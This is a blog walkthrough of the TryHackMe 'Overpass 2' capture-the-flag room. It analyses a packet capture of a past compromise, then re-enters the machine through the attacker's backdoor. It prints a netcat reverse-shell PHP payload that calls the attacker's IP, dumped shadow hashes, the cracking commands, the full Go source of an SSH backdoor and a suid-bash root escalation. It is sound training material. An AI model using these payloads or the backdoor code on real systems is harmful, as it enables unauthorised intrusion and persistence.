---
title: "tryhackme: overpass2"
date: 2021-10-27T16:16:04+04:00
draft: false
tags: ["cybersec", "tryhackme", "walkthrough", "pentesting", "wireshark"]
type: "post"
---

i'm going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the "advanced exploitation" chapter, of the "offensive pentesting" path. it's also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called "overpass". 

this room is interesting and different because the "target" in question has already been hacked, and it's our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network.

![cooctus](/overpass-cooctus.png)

the overpass SOC team managed to capture the packets in wireshark during the attack, and save them as a .pcap file. we've been given the .pcap file to analyze, so let's go ahead and do that.

![.pcap](/overpass-pcap.png)

this is what we first see when we open the file in wireshark. it's a lot of information, but we can see a bunch of TCP and HTTP requests made from a source (192.168.170.145) to a destination (192.168.170.159). 

let's set a display filter so we only see the HTTP requests. we can do this by entering ```http``` in the "apply a display filter" field.

![pcap2](/overpass-pcap2.png)

we can see that the source (attacker?) requested the /development/ URL. the first packet has the ```GET /development/``` request header. the server responds, and then the source makes a POST request to an upload form of sorts (header ```POST /development/upload.php```).

if we right-click on the packet, and click "follow TCP stream", it will show us the information that was contained within that packet.

![stream](/overpass-tcpstream.png)

we can see that the source/attacker uploaded a .php file called "payload.php". doesn't leave much to the imagination, does it? right under that, we can see the payload's code in clear text:

```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

this script would have created a php reverse shell, which the attacker would control using netcat. the shell would have connected to port 4242.

the good (and bad) thing about using netcat to control reverse shells is that all the traffic is unencrypted, and should be visible in stream data that is captured.

let's apply a TCP stream filter to see the contents of the traffic. in the display filter field, type ```tcp.stream eq 3```.

![stream2](/overpass-tcpstream2.png)

![stream2](/overpass-tcpstream3.png)

this stream has captured all the traffic that was traveling through the attacker's shell. we can see that they logged in as a low privilege user "james" and used the password "whenevernoteartinstant". attacker then runs ```sudo -l``` to see what commands james can run, and turns out james can run pretty much anything. this means that james isn't exactly a low privilege user!

the attacker then dumps the contents of the /etc/shadow file. this file, as you may know, contains all the secure user account information. it stores actual passwords' hashes. we can see that some user hashes were dumped as well:

```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

we can attempt to crack these hashes using john. first, let's identify the hashes. you can use any tool you prefer. i used the hash-identifier tool on my machine. hopefully, you will be able to identify it as sha512crypt.

save the hashes to a file, and run john to crack them using the following command:

```
john -w=/usr/share/wordlists/fasttrack.txt --format=crypt systemhashes.txt
```

![john](/overpass-john.png)

we were able to crack 4 users' passwords. 

right after dumping the hashes, the attacker then tries to establish persistence via an SSH backdoor. they cloned a repo from github, known as [ssh-backdoor](https://github.com/NinjaJc01/ssh-backdoor). they then generate a public/private key pair. the attacker modifies the permissions on the backdoor using ```chmod +x backdoor``` and then login to it using:

```
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

the backdoor connects over the port 2222.

let's visit the github repo above and try to analyze the main code.

```go

package main

import (
	"crypto/sha512"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os/exec"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	"github.com/integrii/flaggy"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"

func main() {
	var (
		lport       uint   = 2222
		lhost       net.IP = net.ParseIP("0.0.0.0")
		keyPath     string = "id_rsa"
		fingerprint string = "OpenSSH_8.2p1 Debian-4"
	)

	flaggy.UInt(&lport, "p", "port", "Local port to listen for SSH on")
	flaggy.IP(&lhost, "i", "interface", "IP address for the interface to listen on")
	flaggy.String(&keyPath, "k", "key", "Path to private key for SSH server")
	flaggy.String(&fingerprint, "f", "fingerprint", "SSH Fingerprint, excluding the SSH-2.0- prefix")
	flaggy.String(&hash, "a", "hash", "Hash for backdoor")
	flaggy.Parse()

	log.SetPrefix("SSH - ")
	privKeyBytes, err := ioutil.ReadFile(keyPath)
	if err != nil {
		log.Panicln("Error reading privkey:\t", err.Error())
	}
	privateKey, err := gossh.ParsePrivateKey(privKeyBytes)
	if err != nil {
		log.Panicln("Error parsing privkey:\t", err.Error())
	}
	server := &ssh.Server{
		Addr:            fmt.Sprintf("%s:%v", lhost.String(), lport),
		Handler:         sshterminal,
		Version:         fingerprint,
		PasswordHandler: passwordHandler,
	}
	server.AddHostKey(privateKey)
	log.Println("Started SSH backdoor on", server.Addr)
	log.Fatal(server.ListenAndServe())
}
func verifyPass(hash, salt, password string) bool {
	resultHash := hashPassword(password, salt)
	return resultHash == hash
}

func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}

func sshHandler(s ssh.Session) {
	command := s.RawCommand()
	if command != "" {
		s.Write(runCommand(command))
		return
	}
	term := terminal.NewTerminal(s, "$ ")
	for {
		command, _ = term.ReadLine()
		if command == "exit" {
			return
		}
		term.Write(runCommand(command))
	}
}

func sshterminal(s ssh.Session) {
	cmd := exec.Command("/bin/bash", "-i")
	ptyReq, _, isPty := s.Pty()
	if isPty {
		cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
		f, err := pty.Start(cmd)
		if err != nil {
			panic(err)
		}
		go func() {
			io.Copy(f, s) // stdin
		}()
		io.Copy(s, f) // stdout
		cmd.Wait()
	} else {
		io.WriteString(s, "No PTY requested.\n")
		s.Exit(1)
	}
}

func runCommand(cmd string) []byte {
	result := exec.Command("/bin/bash", "-c", cmd)
	response, _ := result.CombinedOutput()
	return response
}

func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)

```

we can see that the program first assigns a default hash:

```go
var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```

as we proceed further, there's a function called ```verifyPass```:

```go
func verifyPass(hash, salt, password string)
```

towards the bottom of the program, we see that a hardcoded salt is passed to the function:

```go
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
```

do you remember the hash the attacker used to login to the backdoor? that hash had this salt hardcoded onto it. identifying the attacker's hash as ```SHA512($pass.$salt)```, we can now try crack it. this time, i used hashcat:

```
hashcat.exe -a 0 -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" C:\rockyou.txt --force
```

the password we get after the hash is cracked is "november16".


let's now login to the attacker's backdoor. our target IP is 10.10.12.175, and the backdoor was running on port 2222:

```
ssh -p 2222 james@10.10.12.175
```

![backdoor](/overpass-backdoor.png)

we are logged in as james, into the backdoor, and we can access the user.txt flag.

while we're here, let's run ```ls -la``` and see what we get.

![backdoor](/overpass-backdoor2.png)

we can see a root process called ```.suid_bash```. a quick google search shows that this little exploit opens a bash shell as root, meaning although an attacker may not be root, running the process will give them the effective privileges of root.

![bash](/overpass-suidbash.png)

so let's run this process by typing ```./.suid_bash -p``` and get the root flag.

![backdoor](/overpass-suidbash2.png)



uploading a php reverse shell via an upload form is a very simple and preventable attack vector. it can give an attacker direct access to the target. in this case, a backdoor was also set up, which should be prevented at all costs. a quick fix would have been to set up multiple firewalls (using iptables, ufw, or whichever linux firewall they choose) and having an implicit deny for all traffic other than what is specifically allowed. 

a proxy with deep packet inspection capabilities, and which intercepts SSL/TLS connections and blocks any suspicious outbound traffic would also have helped. a simpler solution is to disable the ability for executables to run from temp directories. 

finally, if your company wants to spend the time in understanding and implementing software restriction policies, which only allow known executables to run, that is the best solution.

